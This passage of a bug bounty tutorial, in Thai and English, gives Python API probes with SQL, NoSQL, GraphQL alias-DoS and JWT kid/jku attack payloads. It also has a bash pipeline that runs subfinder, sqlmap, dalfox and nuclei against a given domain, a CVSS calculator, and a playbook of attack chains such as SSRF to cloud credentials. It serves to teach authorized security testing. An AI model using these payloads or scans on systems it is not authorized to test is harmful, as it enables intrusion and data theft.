            '/redoc', '/.well-known/openapi',
        ]
        
        for path in common_paths:
            url = base_url + path
            try:
                req = urllib.request.Request(url)
                with urllib.request.urlopen(req, timeout=5) as resp:
                    if resp.status == 200:
                        content_type = resp.headers.get('Content-Type', '')
                        endpoints.append({
                            'path': path,
                            'status': 200,
                            'content_type': content_type
                        })
                        print(f"Found: {url} ({content_type[:30]})")
            except Exception:
                pass
        
        return endpoints
    
    def test_http_methods(self, api_endpoint: str) -> Dict:
        """Test allowed HTTP methods"""
        methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS', 'TRACE']
        results = {}
        
        for method in methods:
            try:
                req = urllib.request.Request(api_endpoint, method=method)
                with urllib.request.urlopen(req, timeout=5) as resp:
                    results[method] = resp.status
            except urllib.error.HTTPError as e:
                results[method] = e.code
            except Exception:
                results[method] = 'error'
        
        # Check for dangerous methods
        dangerous = ['TRACE', 'PUT', 'DELETE']
        for method in dangerous:
            if results.get(method) in [200, 201, 204]:
                print(f"[!] DANGEROUS METHOD ALLOWED: {method} -> {results[method]}")
        
        return results
    
    def graphql_introspection(self, graphql_url: str) -> Dict:
        """Test GraphQL introspection and vulnerabilities"""
        import json
        
        # Introspection query
        introspection_query = """
        {
          __schema {
            types { name description fields { name } }
            queryType { name fields { name } }
            mutationType { name fields { name } }
          }
        }
        """
        
        # Batch introspection bypass
        batch_query = [{"query": introspection_query} for _ in range(3)]
        
        # Common GraphQL vulnerabilities
        vulns = [
            {'name': 'Introspection enabled',
             'test': introspection_query},
            {'name': 'GraphQL batch attack',
             'test': batch_query},
            {'name': 'NoSQL injection',
             'test': '{user(id: {$gt: ""}){ email }}'},
            {'name': 'SQL injection',
             'test': '{user(id: "1 OR 1=1") { email }}'},
            {'name': 'Alias overload DoS',
             'test': '{' + ''.join([f'a{i}: user(id:1){{name}} ' for i in range(100)]) + '}'},
        ]
        
        return {'url': graphql_url, 'tests': vulns}
    
    def test_jwt_vulnerabilities(self, jwt_token: str) -> List[Dict]:
        """Test JWT for vulnerabilities"""
        import base64
        import json
        
        findings = []
        
        # Decode header
        try:
            header_b64 = jwt_token.split('.')[0]
            header = json.loads(base64.urlsafe_b64decode(header_b64 + '=='))
            
            # Check algorithm
            alg = header.get('alg', '')
            if alg == 'none':
                findings.append({'type': 'CRITICAL', 'issue': 'Algorithm none accepted'})
            elif alg in ['HS256', 'HS384', 'HS512']:
                findings.append({'type': 'INFO', 'issue': f'HMAC algorithm: {alg}',
                                 'test': 'Try RS256->HS256 confusion attack'})
            
            # Check kid header injection
            if 'kid' in header:
                findings.append({'type': 'MEDIUM', 
                                'issue': 'kid header present - test SQL/path injection',
                                'payload': "../../dev/null"})
            
            # Check jku/x5u
            if 'jku' in header or 'x5u' in header:
                findings.append({'type': 'HIGH',
                                'issue': 'jku/x5u header - test JWK injection',
                                'attack': 'Host your own JWK set and point jku to it'})
        except Exception as e:
            findings.append({'type': 'ERROR', 'issue': str(e)})
        
        return findings
```

---

## Step 428: Automation Tools สำหรับ Bug Bounty

```bash
#!/bin/bash
# Bug Bounty Automation Pipeline

DOMAIN="$1"
OUT="/tmp/bb_$DOMAIN"
mkdir -p $OUT/{subs,urls,vuln}

echo "[*] Target: $DOMAIN"

# ===== SUBDOMAIN ENUM =====
subfinder -d $DOMAIN -all -silent -o $OUT/subs/sf.txt
amass enum -passive -d $DOMAIN -o $OUT/subs/amass.txt 2>/dev/null
assetfinder --subs-only $DOMAIN > $OUT/subs/af.txt
cat $OUT/subs/*.txt | sort -u | anew $OUT/subs/all.txt

# Live host check
httpx -l $OUT/subs/all.txt -silent -status-code -title -o $OUT/subs/live.txt
awk '{print $1}' $OUT/subs/live.txt | sort -u > $OUT/subs/live_urls.txt
echo "[*] Live: $(wc -l < $OUT/subs/live_urls.txt)"

# ===== URL COLLECTION =====
gau $DOMAIN --o $OUT/urls/gau.txt 2>/dev/null
waybackurls $DOMAIN > $OUT/urls/wayback.txt 2>/dev/null  
cat $OUT/urls/*.txt | sort -u | anew $OUT/urls/all.txt
echo "[*] URLs: $(wc -l < $OUT/urls/all.txt)"

# ===== VULNERABILITY CHECKS =====

# SQL Injection with sqlmap
grep -E '\?.*=' $OUT/urls/all.txt | head -50 | sqlmap -m - --batch --level 2 --risk 1 \
    --output-dir $OUT/vuln/sqlmap/ 2>/dev/null

# XSS with dalfox
grep -E '\?.*=' $OUT/urls/all.txt | dalfox pipe -o $OUT/vuln/xss.txt 2>/dev/null

# SSRF check with nuclei
nuclei -l $OUT/subs/live_urls.txt -t ~/nuclei-templates/ssrf/ -o $OUT/vuln/ssrf.txt

# Full nuclei scan
nuclei -l $OUT/subs/live_urls.txt \
    -t ~/nuclei-templates/cves/ \
    -t ~/nuclei-templates/vulnerabilities/ \
    -t ~/nuclei-templates/misconfiguration/ \
    -severity high,critical \
    -o $OUT/vuln/nuclei.txt

# ===== SCREENSHOT =====
gowitness file -f $OUT/subs/live_urls.txt -P $OUT/screenshots/ 2>/dev/null

echo "[*] Done! Results: $OUT/"
ls -la $OUT/vuln/
```

---

## Step 429: Writing Professional Bug Reports

```python
from dataclasses import dataclass, field
from typing import List, Optional
import datetime

@dataclass
class BugReport:
    title: str
    severity: str
    cvss_score: float
    affected_asset: str
    vulnerability_type: str
    description: str
    steps_to_reproduce: List[str]
    proof_of_concept: str
    impact: str
    remediation: str
    references: List[str] = field(default_factory=list)
    reporter: str = 'Security Researcher'
    date: str = field(default_factory=lambda: datetime.date.today().isoformat())

class BugReportGenerator:
    """สร้าง bug report คุณภาพสูง"""
    
    SEVERITY_GUIDANCE = {
        'Critical (9.0-10.0)': [
            'Full account takeover',
            'SQL injection with data exfiltration',
            'Remote Code Execution',
            'Authentication bypass',
        ],
        'High (7.0-8.9)': [
            'SSRF with cloud metadata access',
            'Stored XSS on sensitive pages',
            'IDOR accessing sensitive user data',
            'Privilege escalation to admin',
        ],
        'Medium (4.0-6.9)': [
            'Reflected XSS',
            'CSRF on sensitive functions',
            'IDOR on non-sensitive data',
            'Information disclosure',
        ],
        'Low (0.1-3.9)': [
            'Open redirect',
            'Clickjacking on non-sensitive pages',
            'Content spoofing',
            'Missing security headers',
        ]
    }
    
    def generate_markdown_report(self, report: BugReport) -> str:
        """Generate professional markdown bug report"""
        return f"""## {report.title}

**Severity**: {report.severity}  
**CVSS Score**: {report.cvss_score}  
**Asset**: {report.affected_asset}  
**Vulnerability Type**: {report.vulnerability_type}  
**Reported**: {report.date}  

---

### Summary

{report.description}

---

### Steps to Reproduce

{chr(10).join(f'{i+1}. {step}' for i, step in enumerate(report.steps_to_reproduce))}

---

### Proof of Concept

```
{report.proof_of_concept}
```

> **Note**: Replace `TARGET_HOST` with actual target. The vulnerability has been validated on [date].

---

### Impact

{report.impact}

---

### Remediation

{report.remediation}

---

### References

{chr(10).join(f'- {ref}' for ref in report.references)}
"""
    
    def calculate_cvss_score(self, attack_vector: str, attack_complexity: str,
                              privileges_required: str, user_interaction: str,
                              scope: str, confidentiality: str,
                              integrity: str, availability: str) -> float:
        """Calculate CVSS v3.1 score"""
        # CVSS v3.1 base score calculation
        av_scores = {'N': 0.85, 'A': 0.62, 'L': 0.55, 'P': 0.20}
        ac_scores = {'L': 0.77, 'H': 0.44}
        pr_scores_no_scope = {'N': 0.85, 'L': 0.62, 'H': 0.27}
        pr_scores_scope_changed = {'N': 0.85, 'L': 0.68, 'H': 0.50}
        ui_scores = {'N': 0.85, 'R': 0.62}
        cia_scores = {'N': 0.00, 'L': 0.22, 'H': 0.56}
        
        av = av_scores.get(attack_vector[0], 0)
        ac = ac_scores.get(attack_complexity[0], 0)
        scope_changed = scope == 'Changed'
        pr_map = pr_scores_scope_changed if scope_changed else pr_scores_no_scope
        pr = pr_map.get(privileges_required[0], 0)
        ui = ui_scores.get(user_interaction[0], 0)
        c = cia_scores.get(confidentiality[0], 0)
        i = cia_scores.get(integrity[0], 0)
        a = cia_scores.get(availability[0], 0)
        
        exploitability = 8.22 * av * ac * pr * ui
        iss = 1 - ((1 - c) * (1 - i) * (1 - a))
        
        if scope_changed:
            impact = 7.52 * (iss - 0.029) - 3.25 * ((iss - 0.02) ** 15)
        else:
            impact = 6.42 * iss
        
        if impact <= 0:
            return 0.0
        elif scope_changed:
            base_score = min(1.08 * (impact + exploitability), 10)
        else:
            base_score = min(impact + exploitability, 10)
        
        # Round up to 1 decimal
        import math
        return math.ceil(base_score * 10) / 10
```

---

## Step 430: Bug Bounty Mindset และ Tips

```python
BUG_BOUNTY_PLAYBOOK = '''
=== Bug Bounty Playbook for Top Hunters ===

## 1. Target Selection Strategy

Private Programs:
- Lower competition, higher signal-to-noise
- Better triager attention
- Often newer attack surfaces
- Earn invitations by building reputation

New Programs:
- Low-hanging fruit often still exists
- Program owners less experienced with reports
- Larger scope initially

Wild Cards (*.example.com):
- More subdomains = more attack surface
- Focus on forgotten/non-maintained subdomains
- Dev/staging environments often have loose security

## 2. Recon Philosophy

"Recon separates $50 reporters from $5,000 reporters"

Ask: What does this company do?
  - Find their entire attack surface
  - Understand their business logic
  - Identify high-value assets (payment, auth, admin)

Go deep, not wide:
  - 3 hours on 1 interesting subdomain > 30 mins on 30 subdomains
  - Understand the application before testing
  - Read source code, JS files, mobile apps

## 3. Vulnerability Prioritization

High-Value Chains:
  XSS -> steal admin cookie -> admin takeover
  SSRF -> cloud metadata -> IAM credentials -> cloud account takeover  
  SQLi -> read /etc/shadow -> credential stuffing
  IDOR -> mass data exposure -> GDPR violation

Chain vulnerabilities:
  Low-severity + Low-severity = High-severity report
  (e.g., IDOR + info disclosure = account takeover)

## 4. Report Quality Tips

Golden rules:
  1. Clear, reproducible steps (triager should get it first try)
  2. Show actual impact, not just theoretical
  3. Include request/response with real data
  4. Provide fix recommendations
  5. Be responsive to triager questions

Common mistakes:
  - Theoretical impact without PoC
  - Testing on other users' accounts (always use test accounts!)
  - Duplicate reports (do recon first)
  - Out-of-scope findings
  - Self-XSS submitted as XSS

## 5. Tools for Top 1%

Passive Recon:
  - ProjectDiscovery suite (subfinder, httpx, nuclei, chaos)
  - Shodan/Censys/FOFA for exposed services
  - BuiltWith/Wappalyzer for tech stack
  - Google dorks + GitHub dorks

Active Testing:
  - Burp Suite Pro with extensions
  - caido (modern alternative)
  - Custom Python scripts
  - Collaborator/interactsh for OOB

## 6. Earning More

- Chain bugs for higher severity
- Focus on P1/P2 vulnerabilities
- Programs with high BB to payout ratios
- Report to VDP even when no bounty (reputation)
- Build reputation -> invites to private programs
- CVE research -> speaking -> consulting

## 7. Hall of Fame Examples

Facebook: IDOR on photos -> $10,000
Google: SSRF in cloud product -> $31,337
Apple: Account takeover -> $100,000+
Yahoo: RCE on server -> $15,000
Dropbox: RCE via code execution -> $32,768
'''

# Print the playbook
print(BUG_BOUNTY_PLAYBOOK)
```

---

## สรุป Part 43

- **Step 421**: Program Selection - scoring, scope analysis, platform comparison
- **Step 422**: Advanced Recon - async subdomain enum, JS secrets extraction, automation pipeline
- **Step 423**: IDOR Hunting - pattern detection, ID manipulation, bulk testing, report template
- **Step 424**: SSRF Discovery - payloads, AWS metadata exploitation, blind SSRF, bypass techniques
- **Step 425**: Advanced XSS - context-aware payloads, DOM sinks/sources, account takeover chains
- **Step 426**: Business Logic - race conditions, mass assignment, price manipulation, ATO flows
- **Step 427**: API Security - OWASP API Top 10, GraphQL introspection, JWT vulnerabilities
- **Step 428**: Automation Tools - subfinder+httpx+nuclei pipeline, sqlmap, dalfox
- **Step 429**: Professional Reports - CVSS calculation, markdown template, severity guidance
- **Step 430**: Bug Bounty Mindset - target selection, recon philosophy, chaining, top 1% tips
